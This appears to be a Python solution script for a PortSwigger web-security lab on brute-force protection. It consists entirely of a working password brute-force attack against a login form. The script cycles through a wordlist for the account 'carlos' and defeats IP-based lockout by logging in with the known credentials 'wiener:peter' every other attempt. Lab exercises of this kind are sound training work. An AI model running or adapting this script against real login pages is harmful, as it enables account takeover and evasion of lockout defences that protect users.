import requests
import sys
import time


#this is a solution i made for the portswigger lab below str
#https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block

url="https://vulnerableapp.com/login"
username = "wiener"
error = "wrong creds"
proxies = {'http': 'http://127.0.0.1:8080'}


try: 
    def bruteCracking(username,url,error):
        count = 0
        data_dict = "username=wiener&password=peter"
        response = requests.post(url, data=data_dict, proxies=proxies)
        while("too many incorrect login attempts") in str(response.text):
            print("IP blocked ! retrying the bruteforce after one minute")
            print(response.text)
            time.sleep(60)
            response = requests.post(url, data=data_dict, proxies=proxies)
        for password in passwords:
            password = password.strip()
            count = count + 1
            if(count == 2 ):
                data_dict = "username=wiener&password=peter"
                response = requests.post(url, data=data_dict, proxies=proxies)
                count=0
                pass
            print("Trying Password: "+ password)
            data_dict = "username=carlos&password="+password
            response = requests.post(url, data=data_dict, proxies=proxies)
            if "Incorrect password" in str(response.text):
                pass
            if "Congratulations" in str(response.text):
                print("the correct password is :  " + password)
                sys.exit()
                    
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

with open("passwords.txt", "r") as passwords:
    bruteCracking(username,url,error)

